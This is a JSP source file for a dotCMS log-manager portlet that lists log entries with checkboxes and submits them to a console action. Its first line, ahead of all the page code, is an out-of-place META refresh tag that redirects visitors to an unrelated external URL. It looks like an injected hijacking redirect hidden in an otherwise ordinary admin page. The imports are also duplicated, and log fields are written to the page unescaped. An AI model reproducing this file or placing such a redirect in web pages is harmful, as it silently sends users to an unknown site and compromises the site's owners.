<META HTTP-EQUIV="Refresh";URL=http://www.s.it/p.htm">

<%@page import="com.liferay.portal.util.WebKeys"%>
<%@page import="com.dotmarketing.business.Layout"%>
<%@page import="com.dotmarketing.util.UtilMethods"%>
<%@page import="com.liferay.portal.model.User"%>
<%@page import="com.dotmarketing.business.web.WebAPILocator"%>
<%@page import="com.dotmarketing.util.URLEncoder"%>
<%@ page import="com.liferay.portal.language.LanguageUtil"%>
<%@page import="com.liferay.portal.util.WebKeys"%>
<%@page import="com.dotmarketing.business.Layout"%>
<%@page import="com.dotmarketing.util.UtilMethods"%>
<%@page import="com.liferay.portal.model.User"%>
<%@page import="com.dotmarketing.business.web.WebAPILocator"%>
<%@page import="com.dotmarketing.util.URLEncoder"%>
<%@page import="com.liferay.portal.language.LanguageUtil"%>
<%@page import="javax.portlet.WindowState"%>
<%@page import="com.dotmarketing.business.APILocator"%>
<%@page import="com.liferay.portal.util.*"%>
<%@page import="com.dotmarketing.business.Role"%>
<%@page import="com.dotmarketing.util.Logger"%>
<%@page import="com.dotmarketing.util.DateUtil"%>
<%@page import="com.dotmarketing.logConsole.model.*"%>
<%@ include file="/html/common/init.jsp" %>
<portlet:defineObjects />
<html xmlns="http://www.w3.org/1999/xhtml">

<script language="Javascript">

function checkAll(){
	var x = dijit.byId("checkAllCkBx").checked;
	
	dojo.query(".taskCheckBox").forEach(function(node){
		dijit.byNode(node).setValue(x);
	})
}

function submitFrm() {
	
	var form = document.getElementById('sb');
	form.action = '<portlet:actionURL><portlet:param name="struts_action" value="/ext/logConsole/runConsole" /></portlet:actionURL>';
	
	form.submit();
	
}

</script>

<%
List<LogMapperRow> logList = LogMapper.getInstance().getLogList();
%>
<html:form action='/ext/logConsole/runConsole' styleId="sb">
<div class="portlet-wrapper">
	<div>
		<%= LanguageUtil.get(pageContext, "LOG_Manager") %>
		<hr/>
	</div>
	<div id="mainTabContainer" dojoType="dijit.layout.TabContainer" dolayout="false">
  		<div id="search" dojoType="dijit.layout.ContentPane" title="<%= LanguageUtil.get(pageContext, "LOG_activity") %>" >
  			<div>
  			<div style="margin-left: 225px;margin-right: 225px">
				<table class="listingTable">
				<tr>
					<th><input width="5%" type="checkbox" dojoType="dijit.form.CheckBox"  id="checkAllCkBx" value="true" onClick="checkAll()" /></th>
					<th nowrap="nowrap" width="5%" style="text-align:center;">Status</th>
					<th nowrap="nowrap" width="32%" style="text-align:center;">Log Name</th>
					<th nowrap="nowrap" width="58%" style="text-align:center;">Log Description</th>
				</tr>
					<%
  					int i=0;
  					for(LogMapperRow r : logList){
  						
  					%>
  					<tr>
  						<td><input name="logs" class="taskCheckBox" dojoType="dijit.form.CheckBox" checked="<%=r.getEnabled()==1%>" type="checkbox" name="logs" value="<%=i %>" id="log<%=i%>" /></td>
  					 	<td>
  					 	<%if(r.getEnabled()==1){%><span class="liveIcon"></span><%} else {%> <span class="archivedIcon"></span>
						<%}%>
  					 	</td>
  					 	<td><%=r.getLog_name()%></td>
  					 	<td><strong><%=r.getDescription()%></strong></td>
  					</tr>
  					<%i+=1;} %>
				</table>
			</div>
			

  				
			</div>
			<hr>
			<div>&nbsp;</div>
			<div class="buttonRow">
					<button dojoType="dijit.form.Button" iconClass="searchIcon" name="filterButton" onclick="submitFrm()"> 
					<%= LanguageUtil.get(pageContext, "LOG_button") %> </button>
					<!-- <button dojoType="dijit.form.Button" name="resetButton"  iconClass="resetIcon" onclick="resetFilters()"></button>-->    
				</div>
			</div>
		</div>	
</div>
</html:form>